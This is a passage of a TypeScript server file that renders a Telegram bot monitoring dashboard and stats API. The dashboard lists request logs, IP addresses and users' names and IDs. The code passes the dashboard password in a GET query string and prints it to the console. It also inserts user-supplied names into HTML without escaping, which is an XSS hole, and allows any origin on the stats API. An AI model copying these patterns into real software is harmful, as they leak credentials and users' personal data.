            background: #3182ce;
        }
        .error {
            color: #e53e3e;
            margin-top: 15px;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="lock-icon">🔒</div>
        <h1>Dashboard Access</h1>
        <form method="GET" action="/status">
            <div class="form-group">
                <label for="password">Enter Password:</label>
                <input type="password" id="password" name="pass" required>
            </div>
            <button type="submit" class="btn">Access Dashboard</button>
        </form>
        ${password ? '<div class="error">❌ Invalid password. Please try again.</div>' : ""}
    </div>
</body>
</html>`

      return new Response(html, {
        headers: { "Content-Type": "text/html" },
      })
    }

    // Generate dashboard
    const stats = serverState.getStats()
    const requestLog = (cache.get("requestLog") as RequestLogEntry[]) || []
    const recentLogs = requestLog.slice(0, 20)
    const botHealthStatus = LogBotManager.getBotHealthStatus()

    const html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Bot Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f8fafc;
            color: #2d3748;
            line-height: 1.6;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 2rem;
            text-align: center;
        }
        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 0.5rem;
        }
        .header p {
            opacity: 0.9;
            font-size: 1.1rem;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 1.5rem;
            margin-bottom: 2rem;
        }
        .stat-card {
            background: white;
            padding: 1.5rem;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
            border-left: 4px solid #4299e1;
        }
        .stat-card.success { border-left-color: #48bb78; }
        .stat-card.warning { border-left-color: #ed8936; }
        .stat-card.error { border-left-color: #f56565; }
        .stat-value {
            font-size: 2rem;
            font-weight: bold;
            margin-bottom: 0.5rem;
        }
        .stat-label {
            color: #718096;
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .section {
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
            margin-bottom: 2rem;
            overflow: hidden;
        }
        .section-header {
            background: #f7fafc;
            padding: 1rem 1.5rem;
            border-bottom: 1px solid #e2e8f0;
            font-weight: 600;
            font-size: 1.1rem;
        }
        .section-content {
            padding: 1.5rem;
        }
        .table {
            width: 100%;
            border-collapse: collapse;
        }
        .table th,
        .table td {
            padding: 0.75rem;
            text-align: left;
            border-bottom: 1px solid #e2e8f0;
        }
        .table th {
            background: #f7fafc;
            font-weight: 600;
            color: #4a5568;
        }
        .status-success { color: #48bb78; font-weight: 600; }
        .status-failed { color: #f56565; font-weight: 600; }
        .status-rate_limited { color: #ed8936; font-weight: 600; }
        .health-bar {
            width: 100%;
            height: 8px;
            background: #e2e8f0;
            border-radius: 4px;
            overflow: hidden;
        }
        .health-fill {
            height: 100%;
            transition: width 0.3s ease;
        }
        .health-good { background: #48bb78; }
        .health-warning { background: #ed8936; }
        .health-critical { background: #f56565; }
        .refresh-btn {
            position: fixed;
            bottom: 2rem;
            right: 2rem;
            background: #4299e1;
            color: white;
            border: none;
            padding: 1rem;
            border-radius: 50%;
            font-size: 1.2rem;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(66, 153, 225, 0.3);
            transition: transform 0.2s;
        }
        .refresh-btn:hover {
            transform: scale(1.1);
        }
        @media (max-width: 768px) {
            .container { padding: 1rem; }
            .stats-grid { grid-template-columns: 1fr; }
            .table { font-size: 0.9rem; }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🚀 Advanced Bot Dashboard</h1>
        <p>Real-time monitoring and analytics</p>
    </div>

    <div class="container">
        <!-- Statistics Overview -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value">${stats.totalRequests.toLocaleString()}</div>
                <div class="stat-label">Total Requests</div>
            </div>
            <div class="stat-card success">
                <div class="stat-value">${stats.successfulRequests.toLocaleString()}</div>
                <div class="stat-label">Successful</div>
            </div>
            <div class="stat-card error">
                <div class="stat-value">${stats.failedRequests.toLocaleString()}</div>
                <div class="stat-label">Failed</div>
            </div>
            <div class="stat-card warning">
                <div class="stat-value">${stats.rateLimitedRequests.toLocaleString()}</div>
                <div class="stat-label">Rate Limited</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">${stats.averageResponseTime.toFixed(1)}ms</div>
                <div class="stat-label">Avg Response Time</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">${Utils.formatUptime(stats.uptime)}</div>
                <div class="stat-label">Uptime</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">${stats.activeConnections}</div>
                <div class="stat-label">Active Connections</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">${Utils.formatBytes(stats.memoryUsage.heapUsed)}</div>
                <div class="stat-label">Memory Usage</div>
            </div>
        </div>

        <!-- Log Bot Health Status -->
        <div class="section">
            <div class="section-header">🤖 Log Bot Health Status</div>
            <div class="section-content">
                <div class="stats-grid">
                    ${botHealthStatus
                      .map(
                        (bot) => `
                        <div class="stat-card">
                            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
                                <strong>${bot.name}</strong>
                                <span style="color: ${bot.inCooldown ? "#ed8936" : "#48bb78"};">
                                    ${bot.inCooldown ? "⏸️ Cooldown" : "✅ Active"}
                                </span>
                            </div>
                            <div class="health-bar">
                                <div class="health-fill ${bot.health >= 70 ? "health-good" : bot.health >= 40 ? "health-warning" : "health-critical"}" 
                                     style="width: ${bot.health}%"></div>
                            </div>
                            <div style="margin-top: 0.5rem; font-size: 0.9rem; color: #718096;">
                                Health: ${bot.health}% | Last used: ${bot.lastUsed ? new Date(bot.lastUsed).toLocaleTimeString() : "Never"}
                            </div>
                        </div>
                    `,
                      )
                      .join("")}
                </div>
            </div>
        </div>

        <!-- Recent Request Logs -->
        <div class="section">
            <div class="section-header">📊 Recent Request Logs (Last 20)</div>
            <div class="section-content">
                <div style="overflow-x: auto;">
                    <table class="table">
                        <thead>
                            <tr>
                                <th>Timestamp</th>
                                <th>Bot Token</th>
                                <th>Status</th>
                                <th>Response Time</th>
                                <th>IP Address</th>
                                <th>Error Details</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${recentLogs
                              .map(
                                (log) => `
                                <tr>
                                    <td>${new Date(log.timestamp).toLocaleString()}</td>
                                    <td><code>${log.token.substring(0, 10)}...</code></td>
                                    <td class="status-${log.status}">${log.status.toUpperCase()}</td>
                                    <td>${log.responseTime.toFixed(2)}ms</td>
                                    <td><code>${log.ipAddress || "unknown"}</code></td>
                                    <td>${log.errorReason || "-"}</td>
                                </tr>
                            `,
                              )
                              .join("")}
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <!-- Recent Interactions -->
        <div class="section">
            <div class="section-header">💬 Recent Bot Interactions (${serverState.interactionBuffer.length} in buffer)</div>
            <div class="section-content">
                <div style="overflow-x: auto;">
                    <table class="table">
                        <thead>
                            <tr>
                                <th>Time</th>
                                <th>Bot</th>
                                <th>User</th>
                                <th>Chat Type</th>
                                <th>Update Type</th>
                                <th>Response Time</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${serverState.interactionBuffer
                              .slice(0, 15)
                              .map(
                                (interaction) => `
                                <tr>
                                    <td>${new Date(interaction.timestamp).toLocaleTimeString()}</td>
                                    <td>@${interaction.botUsername}</td>
                                    <td>
                                        <div>${interaction.user.fullName}</div>
                                        <small style="color: #718096;">@${interaction.user.username} (${interaction.user.id})</small>
                                    </td>
                                    <td><span style="background: #e2e8f0; padding: 2px 6px; border-radius: 4px; font-size: 0.8rem;">${interaction.chat.type}</span></td>
                                    <td><span style="background: #bee3f8; padding: 2px 6px; border-radius: 4px; font-size: 0.8rem;">${interaction.updateType}</span></td>
                                    <td>${interaction.metadata.responseTime.toFixed(2)}ms</td>
                                </tr>
                            `,
                              )
                              .join("")}
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>

    <button class="refresh-btn" onclick="window.location.reload()" title="Refresh Dashboard">
        🔄
    </button>

    <script>
        // Auto-refresh every 30 seconds
        setTimeout(() => {
            window.location.reload();
        }, 30000);
        
        // Add loading indicator
        document.addEventListener('DOMContentLoaded', function() {
            const refreshBtn = document.querySelector('.refresh-btn');
            refreshBtn.addEventListener('click', function() {
                this.innerHTML = '⏳';
                this.style.transform = 'rotate(360deg)';
            });
        });
    </script>
</body>
</html>`

    return new Response(html, {
      headers: { "Content-Type": "text/html" },
    })
  },

  handleStatsAPI(): Response {
    const stats = serverState.getStats()
    const botHealth = LogBotManager.getBotHealthStatus()

    return new Response(
      JSON.stringify({
        stats,
        botHealth,
        interactionBufferSize: serverState.interactionBuffer.length,
        timestamp: new Date().toISOString(),
      }),
      {
        headers: {
          "Content-Type": "application/json",
          "Access-Control-Allow-Origin": "*",
        },
      },
    )
  },
})

console.log(`🚀 Advanced Telegram Bot Server started on port ${process.env.PORT || 3000}`)
console.log(`📊 Dashboard available at: /status?pass=${CONFIG.DASHBOARD_PASSWORD}`)
console.log(`🔧 API endpoint available at: /api/stats`)
